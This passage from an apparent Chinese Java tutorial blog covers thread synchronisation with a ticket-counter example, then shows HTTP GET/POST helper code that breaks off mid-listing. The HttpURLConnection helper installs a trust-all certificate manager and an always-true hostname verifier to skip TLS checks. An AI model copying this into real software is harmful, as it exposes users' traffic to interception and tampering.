class_">Thread</span>(mySync, <span class="hljs-string">&quot;C&quot;</span>);<br><br>        thread1.start();<br>        thread2.start();<br>        thread3.start();<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>执行结果：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">A取票  剩余票数: <span class="hljs-number">9</span><br>C取票  剩余票数: <span class="hljs-number">7</span><br>B取票  剩余票数: <span class="hljs-number">8</span><br>C取票  剩余票数: <span class="hljs-number">5</span><br>A取票  剩余票数: <span class="hljs-number">5</span><br>B取票  剩余票数: <span class="hljs-number">5</span><br>A取票  剩余票数: <span class="hljs-number">4</span><br>B取票  剩余票数: <span class="hljs-number">2</span><br>C取票  剩余票数: <span class="hljs-number">2</span><br>B取票  剩余票数: <span class="hljs-number">0</span><br>A取票  剩余票数: <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>可以看到取票很混乱，有重复的票，显然这是不对的。</p><p>添加<code>synchronized</code>设置同步，这里共享的数据只有票数<code>ticketNums</code>，不过显然想要的是在每次取票时只有一个人，所以在取票的动作<code>pullTick</code>设置同步，只在该方法前添加<code>synchronized</code>，其他不变，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Station</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-variable">ticketNums</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">pullTick</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-keyword">if</span> (ticketNums &gt; <span class="hljs-number">0</span>)&#123;<br>            ticketNums--;<br>            System.out.println(name + <span class="hljs-string">&quot;取票  剩余票数: &quot;</span> + ticketNums);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">A</span>取票  剩余票数: <span class="hljs-number">9</span><br><span class="hljs-attribute">C</span>取票  剩余票数: <span class="hljs-number">8</span><br><span class="hljs-attribute">B</span>取票  剩余票数: <span class="hljs-number">7</span><br><span class="hljs-attribute">A</span>取票  剩余票数: <span class="hljs-number">6</span><br><span class="hljs-attribute">C</span>取票  剩余票数: <span class="hljs-number">5</span><br><span class="hljs-attribute">B</span>取票  剩余票数: <span class="hljs-number">4</span><br><span class="hljs-attribute">C</span>取票  剩余票数: <span class="hljs-number">3</span><br><span class="hljs-attribute">B</span>取票  剩余票数: <span class="hljs-number">2</span><br><span class="hljs-attribute">A</span>取票  剩余票数: <span class="hljs-number">1</span><br><span class="hljs-attribute">A</span>取票  剩余票数: <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>很显然达到了预期的结果。</p><h3 id="其他的线程安全问题"><a href="#其他的线程安全问题" class="headerlink" title="其他的线程安全问题"></a>其他的线程安全问题</h3><p>在java中有三大变量：</p><ul><li><strong>实例变量</strong>：在<strong>堆</strong>中</li><li><strong>静态变量</strong>：在<strong>方法区</strong>中</li><li>局部变量：在<strong>栈</strong>中</li></ul><p>在这三大变量中：<strong>局部变量永远不会存在线程安全问题</strong>。因为局部变量不共享（一个线程一个栈），局部变量在<strong>栈</strong>中。所以局部变量永远都不会共享。</p><p><strong>堆和方法区都是多线程共享的，所以可能存在线程安全问题</strong>。实例变量在堆中，堆只有1个；静态变量在方法区中，方法区只有1个。</p><h3 id="一些方法的线程安全问题"><a href="#一些方法的线程安全问题" class="headerlink" title="一些方法的线程安全问题"></a>一些方法的线程安全问题</h3><p>一些常用方法的线程安全：</p><ol><li>安全的：<ul><li><code>StringBuffer</code></li><li><code>Vector</code></li><li><code>Hashtable</code></li></ul></li><li>不安全的：<ul><li><code>StringBuilder</code></li><li><code>ArrayList</code></li><li><code>HashMap</code></li><li><code>HashSet</code></li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>多线程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[java] java的http请求方法</title>
    <link href="/2022/10/18/%5Bjava%5D%20java%E7%9A%84http%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/"/>
    <url>/2022/10/18/%5Bjava%5D%20java%E7%9A%84http%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="java的http请求方法"><a href="#java的http请求方法" class="headerlink" title="java的http请求方法"></a>java的http请求方法</h1><p>java实现http请求的三种方式：</p><ol><li><code>HttpURLConnection</code>，java标准类</li><li><code>org.apache.commons.httpclient</code></li><li><code>org.apache.http.client</code></li></ol><p>还是更习惯用<code>HttpURLConnection</code>。</p><h2 id="HttpURLConnection"><a href="#HttpURLConnection" class="headerlink" title="HttpURLConnection"></a><code>HttpURLConnection</code></h2><p><code>HttpURLConnection</code>是java标准类，使用时需要注意，传入的url必须带协议的，比如<code>http://wxyy.one/</code>，而不能<code>wxyy.one</code>。</p><p>如果需要跟随跳转的话，就需要得到重定向地址，再次发送请求。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.net.ssl.*;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.net.HttpURLConnection;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> java.security.cert.CertificateException;<br><span class="hljs-keyword">import</span> java.security.cert.X509Certificate;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HttpFirst</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">queryGet</span><span class="hljs-params">(String uri)</span>&#123;<br>        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 创建远程url连接对象</span><br>            <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(uri);<br>            <span class="hljs-comment">// 通过远程url连接对象打开一个连接</span><br>            <span class="hljs-keyword">if</span>(url.getProtocol().toLowerCase().equals(<span class="hljs-string">&quot;https&quot;</span>))&#123;<br>                <span class="hljs-comment">// 忽略证书安全性</span><br>                <span class="hljs-type">HttpsURLConnection</span> <span class="hljs-variable">https</span> <span class="hljs-operator">=</span> (HttpsURLConnection)url.openConnection();<br>                https.setHostnameVerifier(Do_NOT_VERIFY);<br>                connection = https;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                connection = (HttpURLConnection)url.openConnection();<br>            &#125;<br>            <span class="hljs-comment">// 设置请求头</span><br>             connection.setRequestProperty(<span class="hljs-string">&quot;Content-Type&quot;</span>,<span class="hljs-string">&quot;application/x-www-form-urlencoded;charset=UTF-8&quot;</span>);<br>            <span class="hljs-comment">// 设置连接方式</span><br>            connection.setRequestMethod(<span class="hljs-string">&quot;GET&quot;</span>);<br>            <span class="hljs-comment">// 当向远程服务器传送数据/写数据时，需要设置为true，默认false</span><br>            connection.setDoOutput(<span class="hljs-literal">true</span>);<br>            <span class="hljs-comment">// 设置超时事件，单位 ms</span><br>            connection.setConnectTimeout(<span class="hljs-number">10000</span>);<br>            <span class="hljs-comment">// 设置读取远程返回数据时间</span><br>            connection.setReadTimeout(<span class="hljs-number">10000</span>);<br>            <span class="hljs-comment">// 发送请求</span><br>            connection.connect();<br>            <span class="hljs-comment">// 判断连接状态码</span><br>            <span class="hljs-keyword">if</span> (connection.getResponseCode() == HttpURLConnection.HTTP_OK)&#123;<br>                <span class="hljs-comment">// 获取输入流</span><br>                inputStream = connection.getInputStream();<br>                <span class="hljs-comment">// 封装输入流，指定字符集</span><br>                bufferedReader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(inputStream, StandardCharsets.UTF_8));<br>                <span class="hljs-comment">// 存放数据</span><br>                <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">stringBuffer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>                <span class="hljs-type">String</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                <span class="hljs-keyword">while</span> ((tmp = bufferedReader.readLine()) != <span class="hljs-literal">null</span>)&#123;<br>                    stringBuffer.append(tmp);<br>                    stringBuffer.append(<span class="hljs-string">&quot;\r\n&quot;</span>);<br>                &#125;<br>                result = stringBuffer.toString();<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (MalformedURLException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != bufferedReader)&#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    bufferedReader.close();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != inputStream)&#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    inputStream.close();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>            <span class="hljs-comment">// 关闭远程连接</span><br>            <span class="hljs-keyword">if</span> (connection != <span class="hljs-literal">null</span>) &#123;<br>                connection.disconnect();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">queryPost</span><span class="hljs-params">(String uri, String param)</span>&#123;<br>        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 创建远程url连接对象</span><br>            <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(uri);<br>            <span class="hljs-comment">// 通过远程url连接对象打开一个连接</span><br>            <span class="hljs-keyword">if</span>(url.getProtocol().toLowerCase().equals(<span class="hljs-string">&quot;https&quot;</span>))&#123;<br>                <span class="hljs-comment">// 忽略证书安全性</span><br>                <span class="hljs-type">HttpsURLConnection</span> <span class="hljs-variable">https</span> <span class="hljs-operator">=</span> (HttpsURLConnection)url.openConnection();<br>                https.setHostnameVerifier(Do_NOT_VERIFY);<br>                connection = https;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                connection = (HttpURLConnection)url.openConnection();<br>            &#125;<br>            <span class="hljs-comment">// 设置请求头</span><br>             connection.setRequestProperty(<span class="hljs-string">&quot;Content-Type&quot;</span>,<span class="hljs-string">&quot;application/x-www-form-urlencoded;charset=UTF-8&quot;</span>);<br>            <span class="hljs-comment">// 设置连接方式</span><br>            connection.setRequestMethod(<span class="hljs-string">&quot;POST&quot;</span>);<br>            <span class="hljs-comment">// 当向远程服务器传送数据/写数据时，需要设置为true，默认false</span><br>            connection.setDoOutput(<span class="hljs-literal">true</span>);<br>            <span class="hljs-comment">// 设置超时事件，单位 ms</span><br>            connection.setConnectTimeout(<span class="hljs-number">10000</span>);<br>            <span class="hljs-comment">// 设置读取远程返回数据时间</span><br>            connection.setReadTimeout(<span class="hljs-number">10000</span>);<br>            <span class="hljs-comment">// 写参数，参数形式为：name1=value1&amp;name2=value2</span><br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">printWriter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrintWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(connection.getOutputStream()));<br>            printWriter.write(param);<br>            printWriter.flush();<br>            printWriter.close();<br>            <span class="hljs-comment">// 发送请求</span><br>            connection.connect();<br>            <span class="hljs-comment">// 判断连接状态码</span><br>            <span class="hljs-keyword">if</span> (connection.getResponseCode() == HttpURLConnection.HTTP_OK)&#123;<br>                <span class="hljs-comment">// 获取输入流</span><br>                inputStream = connection.getInputStream();<br>                <span class="hljs-comment">// 封装输入流，指定字符集</span><br>                bufferedReader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(inputStream, StandardCharsets.UTF_8));<br>                <span class="hljs-comment">// 存放数据</span><br>                <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">stringBuffer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>                <span class="hljs-type">String</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                <span class="hljs-keyword">while</span> ((tmp = bufferedReader.readLine()) != <span class="hljs-literal">null</span>)&#123;<br>                    stringBuffer.append(tmp);<br>                    stringBuffer.append(<span class="hljs-string">&quot;\r\n&quot;</span>);<br>                &#125;<br>                result = stringBuffer.toString();<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (MalformedURLException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != bufferedReader)&#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    bufferedReader.close();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != inputStream)&#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    inputStream.close();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>            <span class="hljs-comment">// 关闭远程连接</span><br>            <span class="hljs-keyword">if</span> (connection != <span class="hljs-literal">null</span>) &#123;<br>                connection.disconnect();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-comment">// 忽略证书安全性</span><br>    <span class="hljs-keyword">static</span> &#123;<br>        TrustManager[] trustManagers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TrustManager</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">X509TrustManager</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkClientTrusted</span><span class="hljs-params">(X509Certificate[] x509Certificates, String s)</span> <span class="hljs-keyword">throws</span> CertificateException &#123;<br><br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkServerTrusted</span><span class="hljs-params">(X509Certificate[] x509Certificates, String s)</span> <span class="hljs-keyword">throws</span> CertificateException &#123;<br><br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> X509Certificate[] getAcceptedIssuers() &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">X509Certificate</span>[<span class="hljs-number">0</span>];<br>            &#125;<br>        &#125;&#125;;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">SSLContext</span> <span class="hljs-variable">sslContext</span> <span class="hljs-operator">=</span> SSLContext.getInstance(<span class="hljs-string">&quot;TLS&quot;</span>);<br>            sslContext.init(<span class="hljs-literal">null</span>,trustManagers,<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.security.SecureRandom());<br>            HttpsURLConnection.setDefaultSSLSocketFactory(sslContext.getSocketFactory());<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> <span class="hljs-type">HostnameVerifier</span> <span class="hljs-variable">Do_NOT_VERIFY</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HostnameVerifier</span>() &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">verify</span> <span class="hljs-params">(String hostname, SSLSession session)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;<br>    &#125;;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="org-apache-commons-httpclient"><a href="#org-apache-commons-httpclient" class="headerlink" title="org.apache.commons.httpclient"></a><code>org.apache.commons.httpclient</code></h2><p>注意这个是包：<a href="https://mvnrepository.com/artifact/at.bestsolution.efxclipse.eclipse/org.apache.commons.httpclient/3.1.0">Maven Repository: at.bestsolution.efxclipse.eclipse » org.apache.commons.httpclient » 3.1.0 (mvnrepository.com)</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.httpclient.DefaultHttpMethodRetryHandler;<br><span class="hljs-keyword">import</span> org.apache.commons.httpclient.HttpClient;<br><span class="hljs-keyword">import</span> org.apache.commons.httpclient.HttpStatus;<br><span class="hljs-keyword">import</span> org.apache.commons.httpclient.NameValuePair;<br><span class="hljs-keyword">import</span> org.apache.commons.httpclient.methods.GetMethod;<br><span class="hljs-keyword">import</span> org.apache.commons.httpclient.methods.PostMethod;<br><span class="hljs-keyword">import</span> org.apache.commons.httpclient.params.HttpMethodParams;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> java.util.Iterator;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.Set;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HttpSecond</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">queryGet</span><span class="hljs-params">(String uri)</span>&#123;<br>        <span class="hljs-comment">// 输入流</span><br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">// 创建HttpClient实例</span><br>        <span class="hljs-type">HttpClient</span> <span class="hljs-variable">httpClient</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpClient</span>();<br>        <span class="hljs-comment">// 设置http连接主机服务超时时间</span><br>        <span class="hljs-comment">// 先获取连接管理器对象，再获取参数对象,再进行参数的赋值</span><br>        